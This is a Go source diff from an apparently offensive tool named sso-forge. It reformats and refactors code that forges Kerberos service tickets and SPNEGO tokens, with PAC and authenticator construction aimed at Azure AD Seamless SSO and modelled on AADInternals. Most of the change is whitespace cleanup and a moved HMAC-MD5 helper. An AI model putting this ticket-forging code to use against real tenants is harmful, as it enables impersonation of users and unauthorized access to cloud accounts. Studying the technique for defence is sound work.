@@ -3,11 +3,11 @@
 package ticket
 
 import (
-	"crypto/hmac"
 	cryptorand "crypto/rand"
-	"crypto/md5" //nolint:gosec
 	"fmt"
 	"time"
+
+	"github.com/JVBotelho/sso-forge/pac"
 
 	"github.com/jcmturner/gokrb5/v8/crypto"
 	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
@@ -120,15 +120,15 @@ func buildTicketBodyDER(authTime, endTime, renewTime time.Time, sessKey []byte, 
 }
 
 func buildTicketAuthDataDER(p *ForgeParams) []byte {
-	// AADInternals wraps each auth-data entry in a SEQUENCE, and the 
+	// AADInternals wraps each auth-data entry in a SEQUENCE, and the
 	// AD-IF-RELEVANT OCTET STRING contains a SEQUENCE OF entries.
 	return derSeq(
 		// Entry 1: AD-IF-RELEVANT wrapping AD-WIN2K-PAC
 		// SEQUENCE { [0]=1, [1]=OCTET { SEQUENCE { SEQUENCE { [0]=128, [1]=OCTET{PAC} } } } }
 		derSeq(
 			derTag(0xA0, derInt2(0x00, 0x01)),
-			derTag(0xA1, derOctet(derSeq(          // SEQUENCE OF inner entries
-				derSeq(                              // inner entry
+			derTag(0xA1, derOctet(derSeq( // SEQUENCE OF inner entries
+				derSeq( // inner entry
 					derTag(0xA0, derInt2(0x00, 0x80)),
 					derTag(0xA1, derOctet(p.PAC)),
 				),
@@ -137,12 +137,12 @@ func buildTicketAuthDataDER(p *ForgeParams) []byte {
 		// Entry 2: AD-IF-RELEVANT wrapping TokenRestrictions + KerbLocal
 		derSeq(
 			derTag(0xA0, derInt2(0x00, 0x01)),
-			derTag(0xA1, derOctet(derSeq(          // SEQUENCE OF inner entries
+			derTag(0xA1, derOctet(derSeq( // SEQUENCE OF inner entries
 				// Token Restrictions
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x8D)),
-					derTag(0xA1, derOctet(derSeq(  // SEQUENCE OF LSAP_TOKEN_INFO_INTEGRITY
-						derSeq(                      // single restriction
+					derTag(0xA1, derOctet(derSeq( // SEQUENCE OF LSAP_TOKEN_INFO_INTEGRITY
+						derSeq( // single restriction
 							derTag(0xA0, derInt1(0)),
 							derTag(0xA1, derOctet(tokenRestrictionData(p.MachineID))),
 						),
@@ -160,8 +160,9 @@ func buildTicketAuthDataDER(p *ForgeParams) []byte {
 
 func tokenRestrictionData(machineID []byte) []byte {
 	b := make([]byte, 40)
-	b[4] = 0x00; b[5] = 0x20 // IntegrityLevel = Medium (0x2000)
-	copy(b[8:], machineID)   // MachineId (32 bytes) at offset 8-39
+	b[4] = 0x00
+	b[5] = 0x20            // IntegrityLevel = Medium (0x2000)
+	copy(b[8:], machineID) // MachineId (32 bytes) at offset 8-39
 	return b
 }
 
@@ -170,9 +171,11 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 	subKeyType := byte(23) // RC4
 	subKeySize := 16
 	if p.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
-		subKeyType = 18; subKeySize = 32
+		subKeyType = 18
+		subKeySize = 32
 	} else if p.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
-		subKeyType = 17; subKeySize = 16
+		subKeyType = 17
+		subKeySize = 16
 	}
 	return der(
 		0x62, // APPLICATION 2
@@ -200,8 +203,8 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 				derTag(0xA0, derInt1(subKeyType)),
 				derTag(0xA1, derOctet(randomBytes(subKeySize))),
 			)),
-		// [7] seq-number
-		derTag(0xA7, derIntBytes(seqNumber)),
+			// [7] seq-number
+			derTag(0xA7, derIntBytes(seqNumber)),
 			// [8] authorization-data
 			derTag(0xA8, buildAuthAuthDataDER(machineID, kerbLocal2, p)),
 		),
@@ -210,16 +213,26 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 
 func gssChecksumData() []byte {
 	b := make([]byte, 24)
-	b[0] = 0x10; b[1] = 0x00; b[2] = 0x00; b[3] = 0x00
-	b[20] = 0x3E; b[21] = 0x20; b[22] = 0x00; b[23] = 0x00
+	b[0] = 0x10
+	b[1] = 0x00
+	b[2] = 0x00
+	b[3] = 0x00
+	b[20] = 0x3E
+	b[21] = 0x20
+	b[22] = 0x00
+	b[23] = 0x00
 	return b
 }
 
 func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 	svcName := "HTTP/autologon.microsoftazuread-sso.com@" + p.Realm
 	encType := byte(23) // RC4
-	if p.EType == etypeID.AES256_CTS_HMAC_SHA1_96 { encType = 18 }
-	if p.EType == etypeID.AES128_CTS_HMAC_SHA1_96 { encType = 17 }
+	if p.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
+		encType = 18
+	}
+	if p.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
+		encType = 17
+	}
 
 	return derSeq(
 		derSeq(
@@ -260,8 +273,6 @@ func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 	)
 }
 
-
-
 // buildAPREQDER constructs the AP-REQ ticket envelope.
 func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
 	return der(
@@ -277,9 +288,9 @@ func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
 			derTag(0xA3, der(
 				0x61, // APPLICATION 1 = Ticket
 				derSeq(
-					derTag(0xA0, derInt1(5)),       // tkt-vno
+					derTag(0xA0, derInt1(5)),         // tkt-vno
 					derTag(0xA1, derGenStr(p.Realm)), // realm
-					derTag(0xA2, derSeq(             // sname
+					derTag(0xA2, derSeq( // sname
 						derTag(0xA0, derInt1(2)), // KRB5-NT-SRV-INST
 						derTag(0xA1, derSeq(
 							derGenStr("HTTP"),
@@ -288,15 +299,15 @@ func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
 					)),
 					derTag(0xA3, derSeq( // enc-part
 						derTag(0xA0, derInt1(byte(p.EType))), // etype
-						derTag(0xA1, derInt1(5)),              // kvno
-						derTag(0xA2, derOctet(encTicket)),     // cipher
+						derTag(0xA1, derInt1(5)),             // kvno
+						derTag(0xA2, derOctet(encTicket)),    // cipher
 					)),
 				),
 			)),
 			// [4] authenticator
 			derTag(0xA4, derSeq(
 				derTag(0xA0, derInt1(byte(p.EType))), // etype
-				derTag(0xA2, derOctet(encAuth)),       // cipher
+				derTag(0xA2, derOctet(encAuth)),      // cipher
 			)),
 		),
 	)
@@ -307,9 +318,9 @@ func buildSPNEGO(apreq []byte) []byte {
 	// Build mechToken: GSS-API InitialContextToken wrapping KRB_AP_REQ
 	mechToken := der(
 		0x60,
-		oidKerberosV5Der,                // OID
-		[]byte{0x01, 0x00},              // BOOLEAN FALSE (AADInternals non-standard: no length byte)
-		apreq,                            // KRB_AP_REQ
+		oidKerberosV5Der,   // OID
+		[]byte{0x01, 0x00}, // BOOLEAN FALSE (AADInternals non-standard: no length byte)
+		apreq,              // KRB_AP_REQ
 	)
 
 	// Build NegTokenInit
@@ -333,7 +344,7 @@ func buildSPNEGO(apreq []byte) []byte {
 
 // Pre-built OID byte sequences for efficiency
 var (
-	oidSPNEGODer    = []byte{0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02}
+	oidSPNEGODer     = []byte{0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02}
 	oidMSKerberosDer = []byte{0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02}
 	oidKerberosV5Der = []byte{0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02}
 	oidNegoExDer     = []byte{0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E}
@@ -450,7 +461,6 @@ func derLen(n int) []byte {
 	return append([]byte{0x80 | byte(len(buf))}, buf...)
 }
 
-
 // ============================================================
 // Encryption (RC4-HMAC or AES-CTS-HMAC-SHA1-96)
 // ============================================================
@@ -478,13 +488,13 @@ func encryptRC4(key, data []byte, usage int) []byte {
 	// K1 = key (NT hash, 16 bytes)
 	// K2 = HMAC-MD5(K1, salt_LE)
 	salt := []byte{byte(usage), 0, 0, 0}
-	k2 := hmacMD5(key, salt)
+	k2 := pac.HmacMD5(key, salt)
 	// plaintext = confounder + data
 	plaintext := append(confounder, data...)
 	// checksum = HMAC-MD5(K2, plaintext)
-	checksum := hmacMD5(k2, plaintext)
+	checksum := pac.HmacMD5(k2, plaintext)
 	// K3 = HMAC-MD5(K2, checksum)
-	k3 := hmacMD5(k2, checksum)
+	k3 := pac.HmacMD5(k2, checksum)
 	// ciphertext = RC4(K3, plaintext)
 	ciphertext := rc4Crypt(k3, plaintext)
 	// Return checksum || ciphertext (checksum PREPENDED for RC4)
@@ -492,12 +502,6 @@ func encryptRC4(key, data []byte, usage int) []byte {
 	result = append(result, checksum...)
 	result = append(result, ciphertext...)
 	return result
-}
-
-func hmacMD5(key, data []byte) []byte {
-	m := hmac.New(md5.New, key)
-	m.Write(data)
-	return m.Sum(nil)
 }
 
 func rc4Crypt(key, data []byte) []byte {
